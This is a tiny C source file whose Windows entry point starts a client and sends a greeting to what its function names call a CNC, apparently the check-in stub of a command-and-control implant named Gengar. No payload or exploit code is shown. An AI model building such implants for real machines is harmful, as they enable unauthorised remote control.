#include <Windows.h>
#include "client.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, LPTSTR lpCmdLine,
                   int nShowCmd) {
  startclient();
  sendtocnc("Hello World, this is Gengar speaking.");
}